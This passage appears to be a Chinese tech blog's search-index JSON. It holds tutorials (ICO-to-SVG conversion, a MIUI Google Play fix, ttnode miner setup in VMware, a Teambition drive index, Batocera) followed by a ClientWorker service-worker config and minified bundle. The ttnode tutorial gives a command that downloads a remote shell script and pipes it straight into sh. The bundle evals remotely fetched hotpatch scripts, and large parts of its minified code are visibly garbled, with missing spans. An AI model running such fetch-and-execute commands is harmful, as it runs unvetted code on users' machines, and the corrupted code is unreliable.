src=&quot;//raw.githubusercontent.com/thun888/tuku/master/img/mdui.min.js&quot;&gt;&lt;/script&gt; like this 结果 修改前 修改后","tags":["oneindex","web"]},{"title":"高质量地从ico转为svg","path":"/2021/高质量地从ico转为svg/","content":"How 先下载&amp;安装CorelDRAW 打开ps将ico转为png 导出后像这样 选择 文件—导入—（选择刚刚的图） 放置在画纸后 右键—轮廓描慕—高质量图像（也可以选其他的,根据实际情况~） 在这里你可以改变三个参数实现不同的效果 点击确定后就能得到2个图像（原来的位图和生成的矢量图） 把原图删掉后将画布调整为生成图大小（例如我这就是210*210） 选择 文件—导出（保存为.svg) 后记 要真想更好一点可以用这个为底，重绘一遍","tags":["网站","转换"]},{"title":"解决小米手机升级MIUI12.5后无法进入谷歌商店","path":"/2021/解决小米手机升级MIUI12-5后无法进入谷歌商店/","content":"之前，用着被抛弃的mi6，升级了12后并无异样，但用第三方包升到12.5后，欸，用不了了 （如图） 显然，是新版的“照明弹”引起的 搜索一下可以看到有好几个 把里面每一个权限选择了“空白通行证”的改为“始终允许”","tags":["MIUI"]},{"title":"VM虚拟机安装甜糖及配置教程","path":"/2021/vm虚拟机安装甜糖及配置教程/","content":"文章部分内容不再适用 背景 一开始我是在电脑上挂网心，但这玩意儿写入缓存不仅多（以至于写掉盘了），钱还给的少。而甜糖在恩山论坛上面的都是Linux下操作的，对我这docker小白很不友好，今天就总结一下最简单的方法 以下内容建议使用FinalShell操作 准备工作 映像包（500g/100g)(在我写的时候又有新版了) vmware 安装 安装vmware(废话) 解压压缩包后。点击后缀为vmx的文件导入 然后点击网络适配器一来生成新的MAC地址（避免用uid重复） 点击开启虚拟机 当然开起成功后就可以通过甜糖app绑定了 当然有时候如果你的网络环境比较复杂搜不到就要在ssh里面查看。 使用ssh连接(账号密码都是root) 输入(进入容器) 12docker exec -it ttnode /bin/bash/usr/node/ttnode -p /mnts 用二维码生成工具，把uid生成二维码再用手机扫码绑定. 如果它显示未配置网络的话就继续看吧 输入 1netstat -tnlp 除计下出65432和22以外的三个端口后在路由器后台设置端口转发这里，以小米路由器为例 等上十几二十分钟甜糖后台同步后即可。 这样甜糖就做好了，但是还有很多东西也可以搞 1.自动领取星愿 保持在容器内不要退出 输入 12apt updateapt install wget curl sudo -y 1wget https://dachui.co/ttnode/node2.sh &amp;&amp; sh node2.sh 输入no后回车(第2步输入y回车即可) 这里面还有很多功能，但我用到的只是5，有需求的可以把都搞上(除了1.2) 选择5后回车 输入手机号码 输入验证码即可 如果还要用到微信通知就继续 在server酱的官网用登录+微信关注后取得sckey填入 成功以后 3.网速监控 虽然FinalShell自带网速监控，但也不总是每天都在电脑旁 输入 1apk add nload 然后就可以通过nload eth0来监控了 Q&amp;A Q:明明什么都设置好了，但就是获取不了IP。 A:(该问题常见于多网卡的情况) 2.Q:为什么收不到验证码？ ​ A:再来一次(如果你一天内已经错了14次的话，就明天再做吧) 3.Q:输指令报错 xxx not found A:缺啥补啥，在容器外用apk add xxx ,容器内用apt install xxx more… 所参考资料 [2021-01-27]让软路由来赚钱ESXi/X86上跑dock甜糖/一键导入简单无脑，小白，懒人专属 【非op套娃】x86以ubuntu为底层跑docker甜糖服务 迄今为止最小的甜糖(ttnode)docker镜像 爱快虚拟机甜糖镜像及pve,esxi等虚拟机安装轻量化Linux详细安装甜糖教程","tags":["甜糖"]},{"title":"搭建Teambition网盘的目录索引","path":"/2021/搭建Teambition网盘的目录索引/","content":"github链接：TeambitionShare 文章已过期！ 准备 Teambition账号 一台云服务器/支持PHP的虚拟主机 安装 这里以宝塔面板为例 先创建 从github把源码下载后上传然后解压 进到/TeambitionShare-master里把源码拉出来 gif:20210101100433 然后配置伪静态（不设置会404） Nginx 123456789101112#根目录伪静态location / &#123; if (!-e $request_filename)&#123; rewrite ^(.*)$ /index.php/?s=$1; &#125;&#125;#二级目录伪静态，自行修改pan为你的二级目录名字location /pan &#123; if (!-e $request_filename)&#123; rewrite ^/pan/(.*)$ /pan/index.php/?s=$1; &#125;&#125; Apache 1234567&lt;IfModule mod_rewrite.c&gt; Options +FollowSymlinks -Multiviews RewriteEngine On RewriteCond %&#123;REQUEST_FILENAME&#125; !-d RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteRule ^(.*)$ index.php/?s=$1 [QSA,PT,L]&lt;/IfModule&gt; 在www.teambition.com上登录账号 新建一个项目（更多里）（不创建项目网盘中的所有的内容都会展示出来） 获取项目id 获取cookie 访问刚刚部署的网站，把cookie和项目id填好 （如果出现500可以删除/config/app.cfg.php重来） ok","tags":["web"]},{"title":"用Batocera搭建属于你的游戏天地","path":"/2020/用batocera搭建属于你的游戏天地/","content":"batocera,是一个以linux为基础，运行在电脑上的一个模拟上古游戏机的系统。 为了使用它，首先我们需要以下物品 准备 手和脑子 U盘（最好3.0，不过2.0也能运行） 电脑 balenaEtcher（选用）（安装方法一） Ventoy（选用）（安装方法二） 安装方法一 声明：这种方法会丢失U盘全部数据，需要备份 安装好balenaEtcher 打开来是这个样子 下载好batocera 点击flash from file,选择刚刚下载好的镜像 点击 Select target,选择你准备好的U盘 确认选择无误后点击 Flash！ 即可完成 安装方法二 声明：这种方法会丢失U盘全部数据，需要备份（但相比第一种还可以用来存文件~) 下载ventoy解压后点Ventoy2Disk.exe运行 next， 然后将刚刚下载后的镜像复制进U盘里（最大的那个分区）即可 后： 在一些电脑上要按F12选择从U盘启动 它将全部机能分配在游戏运行上，相比模拟器性能好许多，对老电脑友好","tags":["linux"]},{"path":"/config.json","content":"{\"name\":\"ClientWorker\",\"hotpatch\":[\"https://raw.hzchu.top/thun888/myblog/gh-page/cw.js\"],\"hotconfig\":[\"https://raw.hzchu.top/thun888/myblog/gh-page/config.yaml\"],\"catch_rules\":[{\"rule\":\"_\",\"transform_rules\":[{\"search\":\"\\\\#.+\",\"searchin\":\"url\",\"replace\":\"\"},{\"search\":\"_\",\"action\":\"fetch\",\"fetch\":{\"engine\":\"fetch\"}},{\"search\":\"(^4|^5)\",\"searchin\":\"status\",\"action\":\"return\",\"return\":{\"body\":\"The GateWay is down!This Page is provided by ClientWorker!\",\"status\":503}}]}]}"},{"path":"/cw.js","content":"(()=>{var __webpack_modules__={385:e=>{e.exports=function(){function e(e,t){this.namespace=e||\"CacheDBDefaultNameSpace\",this.prefix=t||\"CacheDBDefaultPrefix\",this.read=async function(e,t){return t=t||{type:\"text\"},new Promise(((n,r)=>{caches.open(this.namespace).then((r=>{r.match(new Request(`https://${this.prefix}/${encodeURIComponent(e)}`)).then((e=>{switch(t.type){case\"json\":return void n(e.json());case\"arrayBuffer\":return void n(e.arrayBuffer());case\"blob\":return void n(e.blob());default:return void n(e.text())}})).catch((e=>{n(null)}))}))}))},this.write=async function(e,t,n){return n=n||{type:\"text\"},new Promise(((r,i)=>{caches.open(this.namespace).then((i=>{i.put(new Request(`https://${this.prefix}/${encodeURIComponent(e)}`),new Response(t,{headers:{\"Content-Type\":(()=>{switch(n.type){case\"json\":return\"application/json\";case\"arrayBuffer\":case\"blob\":return\"application/octet-stream\";default:return\"text/plain\"}})()}})).then(r(!0)).catch((e=>{r(!1)}))}))}))},this.delete=async function(e){return new Promise(((t,n)=>{caches.open(this.namespace).then((n=>{n.delete(new Request(`https://${this.prefix}/${encodeURIComponent(e)}`)).then(t(!0)).catch((e=>{t(!1)}))}))}))}}return e}()},710:(__unused_webpack___webpack_module__,__webpack_exports__,__webpack_require__)=>{\"use strict\";__webpack_require__.d(__webpack_exports__,{Z:()=>__WEBPACK_DEFAULT_EXPORT__});var js_yaml__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__(272),_chenyfan_cache_db__WEBPACK_IMPORTED_MODULE_1__=__webpack_require__(385),_utils_engine_js__WEBPACK_IMPORTED_MODULE_2__=__webpack_require__(671),_package_json__WEBPACK_IMPORTED_MODULE_3__=__webpack_require__(147);const router_cgi=async request=>{const db=new _chenyfan_cache_db__WEBPACK_IMPORTED_MODULE_1__,urlStr=request.url.toString(),urlObj=new URL(urlStr),pathname=urlObj.pathname,q=e=>urlObj.searchParams.get(e);let config;switch(pathname.split(\"/\")[2]){case\"hello\":return new Response(\"Hello ClientWorker!\");case\"info\":return new Response(JSON.stringify({version:_package_json__WEBPACK_IMPORTED_MODULE_3__.i8}),{headers:{\"Content-Type\":\"application/json\"}});case\"page\":return\"install\"===q(\"type\")?fetch(\"/404\"):new Response(\"Error, page type not found\");case\"api\":switch(q(\"type\")){case\"config\":return fetch(q(\"url\")||\"/config.yaml\").then((e=>e.text())).then((e=>js_yaml__WEBPACK_IMPORTED_MODULE_0__.ZP.load(e))).then((async e=>(await db.write(\"config\",JSON.stringify(e),{type:\"json\"}),new Response(\"ok\")))).catch((async e=>(await db.write(\"config\",\"\"),new Response(e))));case\"clear\":return caches.open(\"ClientWorker_ResponseCache\").then((async e=>e.keys().then((async t=>(await Promise.all(t.map((t=>{e.delete(t)}))),new Response(\"ok\"))))));case\"hotpatch\":if(config=JSON.parse(await db.read(\"config\")),\"object\"!=typeof config.hotpatch)return new Response(\"Error, config.hotpatch not found\");const hotpatch=config.hotpatch;return await _utils_engine_js__WEBPACK_IMPORTED_MODULE_2__.Z.parallel(hotpatch).then((e=>e.text())).then((async script=>{await db.write(\"hotpatch\",script,{type:\"text\"}),eval(script)})),new Response(\"ok\");case\"hotconfig\":if(config=JSON.parse(await db.read(\"config\")),\"object\"!=typeof config.hotconfig)return new Response(\"Error, config.hotconfig not found\");const hotconfig=config.hotconfig,nConfig=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_2__.Z.parallel(hotconfig).then((e=>e.text())).then((e=>js_yaml__WEBPACK_IMPORTED_MODULE_0__.ZP.load(e))).then((e=>JSON.stringify(e))).catch((e=>\"\"));return nConfig&&await db.write(\"config\",nConfig),new Response(\"ok\");default:return new Response(\"Error, api type not found\")}default:return new Response(\"Not Found!, Client Worker!\")}},__WEBPACK_DEFAULT_EXPORT__=router_cgi},755:(__unused_webpack___webpack_module__,__unused_webpack___webpack_exports__,__webpack_require__)=>{\"use strict\";var _cgi_js__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__(710),_chenyfan_cache_db__WEBPACK_IMPORTED_MODULE_1__=__webpack_require__(385),_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__=__webpack_require__(70),_utils_engine_js__WEBPACK_IMPORTED_MODULE_3__=__webpack_require__(671),_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__=__webpack_require__(431);self.clientworkerhandle=async request=>{const domain=new URL(new Request(\"\").url).host,db=new _chenyfan_cache_db__WEBPACK_IMPORTED_MODULE_1__;let tReq=request;const urlStr=tReq.url.toString(),urlObj=new URL(urlStr),pathname=urlObj.pathname;if(\"cw-cgi\"===pathname.split(\"/\")[1])return(0,_cgi_js__WEBPACK_IMPORTED_MODULE_0__.Z)(request);const config=await db.read(\"config\",{type:\"json\"});if(!config)return fetch(request);let tFetched=!1,EngineFetch=!1,fetchConfig={},EngineFetchList=[],tRes=new Response;for(let catch_rule of config.catch_rules)if(\"_\"===catch_rule.rule&&(catch_rule.rule=domain),tReq.url.match(new RegExp(catch_rule.rule)))for(let transform_rule of catch_rule.transform_rules){let tSearched=!1;switch(\"_\"===transform_rule.search&&(transform_rule.search=catch_rule.rule),transform_rule.searchin||\"url\"){case\"url\":tReq.url.match(new RegExp(transform_rule.search,transform_rule.searchflags))&&(tSearched=!0);break;case\"header\":tReq.headers.get(transform_rule.searchkey).match(new RegExp(transform_rule.search,transform_rule.searchflags))&&(tSearched=!0);break;case\"status\":if(!tFetched){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is not fetched yet,the status rule are ignored`);break}String(tRes.status).match(new RegExp(transform_rule.search,transform_rule.searchflags))&&(tSearched=!0);break;case\"statusText\":if(!tFetched){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is not fetched yet,the statusText rule are ignored`);break}tRes.statusText.match(new RegExp(transform_rule.search,transform_rule.searchflags))&&(tSearched=!0);break;case\"body\":if(!tFetched){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is not fetched yet,the body rule are ignored`);break}(await tRes.clone().text()).match(new RegExp(transform_rule.search,transform_rule.searchflags))&&(tSearched=!0);break;default:_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`${tReq.url} the ${transform_rule.searchin} search rule are not supported`)}switch(transform_rule.replacein||\"url\"){case\"url\":if(tFetched&&tSearched){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is already fetched,the url transform rule:${transform_rule.search} are ignored`);break}if(void 0!==transform_rule.replace&&tSearched)if(\"string\"==typeof transform_rule.replace)EngineFetch&&_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`EngineFetch Disabled for ${tReq.url},the request will downgrade to normal fetch`),tReq=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.request(tReq,{url:tReq.url.replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),transform_rule.replace)}),EngineFetch=!1;else{if(EngineFetch){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`Replacement cannot be used for ${tReq.url},the request is already powered by fetch-engine `);break}transform_rule.replace.forEach((e=>{\"_\"!==e?EngineFetchList.push(_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.request(tReq,{url:tReq.url.replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),e)})):EngineFetchList.push(tReq)})),EngineFetch=!0}break;case\"body\":tSearched&&(tFetched?tRes=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.response(tRes,{body:(await tRes.clone().text()).replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),transform_rule.replace)}):tReq=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.request(tReq,{body:(await tReq.clone().text()).replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),transform_rule.replace)}));break;case\"status\":\"string\"==typeof transform_rule.replace&&tSearched&&(tRes=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.response(tRes,{status:tRes.status.replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),transform_rule.replace)}));break;case\"statusText\":\"string\"==typeof transform_rule.replace&&tSearched&&(tRes=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.response(tRes,{statusText:tRes.statusText.replace(new RegExp(transform_rule.replacekey||transform_rule.search,transform_rule.replaceflags),transform_rule.replace)}));break;default:_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`${tReq.url} the ${transform_rule.replacein} replace rule are not supported`)}if(tSearched){if(\"object\"==typeof transform_rule.header)for(var header in transform_rule.header)tFetched?tRes=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.response(tRes,{headers:{[header]:transform_rule.header[header]}}):tReq=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.request(tReq,{headers:{[header]:transform_rule.header[header]}});if(void 0!==transform_rule.action)switch(transform_rule.action){case\"skip\":return fetch(request);case\"fetch\":if(tFetched){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is already fetched,the fetch action are ignored`);break}if(void 0===transform_rule.fetch){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`Fetch Config is not defined for ${tReq.url}`);break}if(fetchConfig={status:transform_rule.fetch.status,mode:transform_rule.fetch.mode,credentials:transform_rule.fetch.credentials,redirect:transform_rule.fetch.redirect,timeout:transform_rule.fetch.timeout,threads:transform_rule.fetch.threads,limit:transform_rule.fetch.limit},!transform_rule.fetch.preflight)for(var eReq in tReq=new Request(tReq.url,{method:(method=tReq.method,\"GET\"===method||\"HEAD\"===method||\"POST\"===method?method:\"GET\"),body:(body=tReq.body,\"POST\"===tReq.method?body:null)}),delete fetchConfig.credentials,EngineFetchList)EngineFetchList[eReq]=new Request(EngineFetchList[eReq].url,tReq);tRes=await new Promise((async(res,rej)=>{const EngineFetcher=async()=>{let cRes;return new Promise((async(resolve,reject)=>{if(EngineFetch)switch(transform_rule.fetch.engine||\"parallel\"){case\"classic\":cRes=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_3__.Z.classic(EngineFetchList,fetchConfig);break;case\"parallel\":cRes=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_3__.Z.parallel(EngineFetchList,fetchConfig);break;case\"KFCThursdayVW50\":4===(new Date).getDay()&&_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(\"VW50! The Best Fetch Engine in the World Said!\"),cRes=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_3__.Z.KFCThursdayVW50(EngineFetchList,fetchConfig);break;default:_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`Fetch Engine ${transform_rule.fetch.engine} is not supported`)}else switch(transform_rule.fetch.engine||\"fetch\"){case\"fetch\":cRes=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_3__.Z.fetch(tReq,fetchConfig);break;case\"crazy\":cRes=await _utils_engine_js__WEBPACK_IMPORTED_MODULE_3__.Z.crazy(tReq,fetchConfig);break;default:_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`${tReq.url} the ${transform_rule.fetch.engine} engine are not supported`)}\"object\"==typeof transform_rule.fetch.cache&&cRes.status===(transform_rule.fetch.status||200)?(cRes=_utils_rebuild_js__WEBPACK_IMPORTED_MODULE_4__.Z.response(cRes,{headers:{ClientWorker_ExpireTime:(new Date).getTime()+Number(eval(transform_rule.fetch.cache.expire||\"0\"))}}),caches.open(\"ClientWorker_ResponseCache\").then((e=>{e.put(tReq,cRes.clone()).then((()=>{resolve(cRes)}))}))):resolve(cRes)}))};\"object\"==typeof transform_rule.fetch.cache?caches.open(\"ClientWorker_ResponseCache\").then((e=>{e.match(tReq).then((e=>{if(e){if(Number(e.headers.get(\"ClientWorker_ExpireTime\"))>(new Date).getTime())return _utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.s(`${tReq.url} is fetched from cache`),void res(e);_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is expired.`),res(Promise.any([EngineFetcher(),new Promise((async(t,n)=>{setTimeout((()=>{_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`${tReq.url} is too late to fetch,even though the cache has expired,so return by cache`),t(e)}),transform_rule.fetch.cache.delay||3e3)}))]))}else _utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`${tReq.url} is not cached!And it is too late to fetch!`),res(EngineFetcher())}))})):res(EngineFetcher())})),tFetched=!0;break;case\"redirect\":if(void 0===transform_rule.redirect){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`Redirect Config is not defined for ${tReq.url}`);break}return\"string\"==typeof transform_rule.redirect.url?Response.redirect(transform_rule.redirect.url,transform_rule.redirect.status||301):Response.redirect(tReq.url.replace(new RegExp(transform_rule.search),transform_rule.redirect.to),transform_rule.redirect.status||301);case\"return\":return void 0===transform_rule.return&&(transform_rule.return={}),new Response(transform_rule.return.body||\"Error!\",{status:transform_rule.return.status||503,headers:transform_rule.return.headers||{}});case\"script\":if(void 0===transform_rule.script){_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.e(`Script Config is not defined for ${tReq.url}`);break}if(\"string\"==typeof transform_rule.script.function){const ClientWorkerAnonymousFunctionName=`ClientWorker_AnonymousFunction_${(new Date).getTime()}`;self[ClientWorkerAnonymousFunctionName]=eval(transform_rule.script.function),transform_rule.script.name=ClientWorkerAnonymousFunctionName}const ScriptAns=await Function(\"return (\"+transform_rule.script.name+\")\")()({fetched:tFetched,request:tReq,response:tRes});if(ScriptAns.fetched){if(transform_rule.script.skip)return ScriptAns.response;tFetched=!0,tRes=ScriptAns.response}else tReq=ScriptAns.request;break;default:_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(`This Action:${transform_rule.action} is not supported yet`)}}}var body,method;return tFetched?tRes:fetch(request)};var __WEBPACK_DEFAULT_EXPORT__={}},70:(e,t,n)=>{\"use strict\";n.d(t,{Z:()=>r});const r={s:e=>{console.log(`%c[SUCCESS]%c ${e}`,\"color:white;background:green;\",\"\")},w:e=>{console.log(`%c[WARNING]%c ${e}`,\"color:brown;background:yellow;\",\"\")},i:e=>{console.log(`%c[INFO]%c ${e}`,\"color:white;background:blue;\",\"\")},e:e=>{console.log(`%c[ERROR]%c ${e}`,\"color:white;background:red;\",\"\")},d:e=>{console.log(`%c[DEBUG]%c ${e}`,\"color:white;background:black;\",\"\")}}},671:(e,t,n)=>{\"use strict\";n.d(t,{Z:()=>o});var r=n(70),i=n(431);Promise.any||(Promise.any=function(e){return new Promise(((t,n)=>{let r=(e=Array.isArray(e)?e:[]).length,i=[];if(0===r)return n(new AggregateError(\"All promises were rejected\"));e.forEach((e=>{e.then((e=>{t(e)}),(e=>{r--,i.push(e),0===r&&n(new AggregateError(i))}))}))}))});const a={fetch:async(e,t)=>(t=t||{status:200},new Promise(((n,r)=>{const i=Object.prototype.toString.call(e);\"[object String]\"!==i&&\"[object Request]\"!==i&&r(`FetchEngine.fetch: req must be a string or Request object,but got ${i}`),setTimeout((()=>{r(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine Fetch\",{status:504,statusText:\"504 All Gateways Timeout\"}))}),t.timeout||5e3),fetch(e,{mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\"}).then((e=>{n(e)})).catch((e=>{r(e)}))}))),crazy:async(e,t)=>{(t=t||{status:200}).threads=t.threads||4,t.trylimit=t.trylimit||10;const n=Object.prototype.toString.call(e);if(\"[object String]\"!==n&&\"[object Request]\"!==n)return void r.Z.e(`FetchEngine.fetch: req must be a string or Request object,but got ${n}`);const o=new AbortController,s=await fetch(e,{signal:o.signal,mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\"}),c=s.headers,l=c.get(\"Content-Length\");return s.status.toString().match(t.status)?new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine Crazy\",{status:504,statusText:\"504 All Gateways Timeout\"}):(o.abort(),!l||l{const a=parseInt(l/t.threads),o=[];for(let n=0;n{let c=1;const l=async()=>{c+=1;const o=i.Z.request(e,{headers:{Range:`bytes=${n*a}-${(n+1)*a-1}`},url:e.url});return fetch(o,{mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\"}).then((e=>e.arrayBuffer())).catch((e=>{if(!(c>=t.trylimit))return l();r()}))};o(l())})));Promise.all(o).then((e=>{const t=[];for(let n=0;n{r(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine Crazy\",{status:504,statusText:\"504 All Gateways Timeout\"}))}),t.timeout||5e3)})))},KFCThursdayVW50:async(e,t)=>{(t=t||{status:200}).threads=t.threads||4,t.trylimit=t.trylimit||10;const n=Object.prototype.toString.call(e);if(\"[object String]\"===n||\"[object Request]\"===n)return r.Z.w(\"FetchEngine.KFCThursdayVW50: reqs is a string or Request object,downgrade to crazy\"),a.crazy(e,t);if(\"[object Array]\"!==n)return r.Z.e(`FetchEngine.KFCThursdayVW50: reqs must be a string or Request object or an array,but got ${n}`),Promise.reject(`FetchEngine.KFCThursdayVW50: reqs must be a string or Request object or an array,but got ${n}`);if(\"[object Array]\"===n&&(0===e.length&&(r.Z.e(\"FetchEngine.KFCThursdayVW50: reqs array is empty\"),reject()),1===e.length))return r.Z.w(\"FetchEngine.KFCThursdayVW50: reqs array is only one,downgrade to crazy\"),a.crazy(e[0],t);const o=new AbortController,s=await a.parallel(e,{signal:o.signal,mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\",timeout:t.timeout||3e4}),c=s.headers,l=c.get(\"Content-Length\");return s.status.toString().match(t.status)&&reject(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine KFCThursdayVW50\",{status:504,statusText:\"504 All Gateways Timeout\"})),o.abort(),!l||l{const s=parseInt(l/t.threads),u=[];for(let n=0;n{let u=1;const p=async()=>{u+=1;const c=[];return e.forEach((e=>{c.push(i.Z.request(e,{headers:{Range:`bytes=${n*s}-${(n+1)*s-1}`},url:e.url}))})),a.parallel(c,{mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\",timeout:t.timeout||3e4,status:206}).then((e=>e.arrayBuffer())).catch((async e=>{if(r.Z.e(`FetchEngine.KFCThursdayVW50: ${await e.text()}`),!(u>=t.trylimit))return p();o()}))};c(p())})));Promise.all(u).then((e=>{const t=[];for(let n=0;n{o(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine KFCThursdayVW50\",{status:504,statusText:\"504 All Gateways Timeout\"}))}),t.timeout||3e4)}))},classic:async(e,t)=>new Promise(((n,i)=>{t=t||{status:200};const o=Object.prototype.toString.call(e);\"[object String]\"===o||\"[object Request]\"===o?(r.Z.w(`FetchEngine.classic: reqs should be an array,but got ${o},this request will downgrade to normal fetch`),n(a.fetch(e,t))):\"[object Array]\"!==o?(r.Z.e(`FetchEngine.classic: reqs must be a string , Request or Array object,but got ${o}`),i()):\"[object Array]\"===o&&(0===o.length&&(r.Z.e(\"FetchEngine.classic: reqs array is empty\"),i()),1===o.length&&(r.Z.w(\"FetchEngine.classic: reqs array is only one element,this request will downgrade to normal fetch\"),n(a.fetch(e[0],t))));const s=new AbortController,c=async e=>new Response(await e.arrayBuffer(),{status:e.status,headers:e.headers,statusText:e.statusText});Promise.any(e.map((e=>{fetch(e,{signal:s.signal,mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\"}).then(c).then((e=>{e.status.toString().match(t.status)&&(s.abort(),n(e))})).catch((e=>{\"DOMException: The user aborted a request.\"==e&&console.log()}))}))),setTimeout((()=>{i(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine Classic\",{status:504,statusText:\"504 All Gateways Timeout\"}))}),t.timeout||5e3)})),parallel:async(e,t)=>new Promise(((n,o)=>{t=t||{status:200};const s=Object.prototype.toString.call(e);\"[object String]\"===s||\"[object Request]\"===s?(r.Z.w(`FetchEngine.parallel: reqs should be an array,but got ${s},this request will downgrade to normal fetch`),n(a.fetch(e,t))):\"[object Array]\"!==s?(r.Z.e(`FetchEngine.parallel: reqs must be a string , Request or Array object,but got ${s}`),o()):\"[object Array]\"===s&&(0===s.length&&(r.Z.e(\"FetchEngine.parallel: reqs array is empty\"),o()),1===s.length&&(r.Z.w(\"FetchEngine.parallel: reqs array is only one element,this request will downgrade to normal fetch\"),n(a.fetch(e[0],t))));const c=new Event(\"abortOtherInstance\"),l=new EventTarget;Promise.any(e.map((async e=>{let r=new AbortController,a=!1;l.addEventListener(c.type,(()=>{a||r.abort()})),fetch(e,{signal:r.signal,mode:t.mode,credentials:t.credential,redirect:t.redirect||\"follow\"}).then((e=>{e.status.toString().match(t.status)&&(a=!0,l.dispatchEvent(c),n(i.Z.response(e,{})))})).catch((e=>{\"DOMException: The user aborted a request.\"==e&&console.log()}))}))),setTimeout((()=>{o(new Response(\"504 All GateWays Failed,ClientWorker Show This Page,Engine Parallel\",{status:504,statusText:\"504 All Gateways Timeout\"}))}),t.timeout||5e3)}))},o=a},431:(e,t,n)=>{\"use strict\";n.d(t,{Z:()=>o});var r=n(70);const i={request:(e,t)=>{\"navigate\"===(e=e.clone()).mode&&r.Z.w(\"You can't rebuild a POST method with body when it is a navigate request.ClientWorker will ignore it's body\");let n=new Request(e,{headers:a(e,t.headers),method:t.method||e.method,mode:\"navigate\"===e.mode?\"same-origin\":t.mode||e.mode,credentials:t.credentials||e.credentials,redirect:t.redirect||e.redirect});return t.url&&(n=new Request(t.url,n)),n},response:(e,t)=>{if(\"opaque\"===e.type)return r.Z.e(\"You can't rebuild a opaque response.ClientWorker will ignore this build\"),e;return new Response(e.body,{headers:a(e,t.headers),status:t.status||e.status,statusText:t.statusText||e.statusText})}},a=(e,t)=>{if(t){const n=new Headers(e.headers);for(let e in t)void 0!==t[e]?n.set(e,t[e]):n.delete(e);return n}return new Headers(e.headers)},o=i},272:(e,t,n)=>{\"use strict\"; /*! js-yaml 4.1.0 https://github.com/nodeca/js-yaml @license MIT */ function r(e){return null==e}n.d(t,{ZP:()=>et});var i={isNothing:r,isObject:function(e){return\"object\"==typeof e&&null!==e},toArray:function(e){return Array.isArray(e)?e:r(e)?[]:[e]},repeat:function(e,t){var n,r=\"\";for(n=0;ns&&(n=r+s-(o=\" ...\").length),{str:a+e.slice(t,n).replace(/\\t/g,\"→\")+o,pos:r-t+a.length}}function l(e,t){return i.repeat(\" \",t-e.length)+e}var u=function(e,t){if(t=Object.create(t||null),!e.buffer)return null;t.maxLength||(t.maxLength=79),\"number\"!=typeof t.indent&&(t.indent=1),\"number\"!=typeof t.linesBefore&&(t.linesBefore=3),\"number\"!=typeof t.linesAfter&&(t.linesAfter=2);for(var n,r=/\\r? |\\r|\\0/g,a=[0],o=[],s=-1;n=r.exec(e.buffer);)o.push(n.index),a.push(n.index+n[0].length),e.position12&63],r+=o[i>>6&63],r+=o[63&i]):2===n?(r+=o[i>>10&63],r+=o[i>>4&63],r+=o[i2&63],r+=o[i{script?(_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.s(\"Hotpatch Loaded!\"),eval(script)):_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.w(\"Hotpatch Not Found!\")})),db.read(\"config\").then((config=>{config=JSON.parse(config)||{},setInterval((()=>{_utils_cons_js__WEBPACK_IMPORTED_MODULE_2__.Z.s(`ClientWorker@${_package_json__WEBPACK_IMPORTED_MODULE_1__.i8} Start to Clean Expired 